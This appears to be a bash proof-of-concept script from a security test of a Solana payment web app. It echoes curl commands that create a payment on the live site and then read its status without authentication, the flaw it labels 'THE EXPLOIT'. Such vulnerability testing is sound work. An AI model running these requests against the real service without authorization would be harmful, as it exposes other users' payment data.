#!/bin/bash

# Test AUTHZ-VULN-06 using basic bash and echo
echo "================================================================================"
echo " AUTHZ-VULN-06: Unauthorized Payment Status Access Test"
echo "================================================================================"
echo ""
echo "Test Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "Target: https://solana-blik.vercel.app"
echo ""

# We need to use an HTTP client - let me create a simple test that documents the exploit
# Since we don't have curl/wget/python/node available in this restricted environment,
# we'll need to use browser automation instead

echo "This test requires an HTTP client (curl, wget, python, or node)."
echo "Please run one of the following commands in your local terminal:"
echo ""
echo "=== Option 1: Using curl ==="
echo ""
echo "# Step 1: Create payment"
echo 'PAYMENT_RESPONSE=$(curl -s -X POST https://solana-blik.vercel.app/api/payments/create \'
echo '  -H "Content-Type: application/json" \'
echo '  -d '"'"'{"amount": 5.0, "merchantWallet": "11111111111111111111111111111111"}'"'"')'
echo ""
echo '# Extract payment ID'
echo 'PAYMENT_ID=$(echo $PAYMENT_RESPONSE | grep -oP '"'"'paymentId":"?\K[^",}]+'"'"')'
echo 'echo "Created payment: $PAYMENT_ID"'
echo 'echo "Full response: $PAYMENT_RESPONSE"'
echo ""
echo "# Step 2: Try to access payment status without auth (THE EXPLOIT)"
echo 'curl -s -X GET "https://solana-blik.vercel.app/api/payments/$PAYMENT_ID/status"'
echo ""
echo "=== Option 2: Using the Python script ==="
echo ""
echo "python3 test_authz_vuln_06.py"
echo ""
echo "=== Option 3: Using the Node.js script ==="
echo ""
echo "node test_authz_vuln_06.js"
echo ""
